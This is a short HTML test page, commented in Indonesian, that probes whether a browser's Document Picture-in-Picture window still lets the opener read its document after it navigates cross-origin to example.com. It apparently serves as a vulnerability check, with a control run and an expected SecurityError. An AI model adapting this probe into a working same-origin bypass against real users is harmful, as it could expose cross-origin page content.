<!doctype html><meta charset=utf-8>
<!-- PREDIKAT (VULN): setelah PiP menampilkan example.com, w.document masih terbaca dari sini
     ORACLE: butuh http(s) + gesture. Klik go, tunggu PiP memuat example.com, lalu klik probe
     CONTROL: klik probe SEBELUM navigasi - harus terbaca (same-origin, wajar)
     EXPECTED-SECURE: sesudah navigasi cross-origin -> SecurityError -->
<button onclick="go()">go</button> <button onclick="probe()">probe</button>
<pre id=p></pre>
<script>
let w = null;
async function go(){
  if (!self.documentPictureInPicture) return p.textContent += '\nPiP API tidak ada = INERT (catat).';
  w = await documentPictureInPicture.requestWindow({ width: 420, height: 220 });
  w.document.body.innerHTML = '<h2>PiP lahir same-origin</h2>';
  setTimeout(() => { w.location.href = 'https://example.com/'; p.textContent += '\nPiP dinavigasikan cross-origin'; }, 600);
}
function probe(){ let r; try { r = 'TERBACA: ' + w.document.title; } catch (e) { r = 'SecurityError (' + e.name + ')'; }
  p.textContent = 'REAL: ' + location.href + '\nbaca w.document: ' + r; }
p.textContent = 'REAL: ' + location.href;
</script>
